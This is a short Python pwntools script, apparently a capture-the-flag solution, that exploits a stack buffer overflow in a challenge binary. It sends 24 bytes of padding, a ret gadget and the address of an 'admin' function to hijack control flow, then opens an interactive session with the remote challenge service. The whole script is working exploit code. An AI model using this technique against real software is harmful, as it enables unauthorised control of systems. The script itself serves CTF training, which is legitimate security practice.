#!/usr/bin/env python3

from pwn import *

exe = ELF("./binary")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path], '''
        b*main+127
        ''')
    else:
        r = remote("cyberchallenge-web", 9041)

    return r


def main():
    r = conn()

    r.sendline(b'ciao')

    rop = ROP(exe)
    pad = 24
    payload = b"a" * pad + p64(rop.ret.address) + p64(exe.sym['admin'])

    r.sendline(payload)
    



    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
    
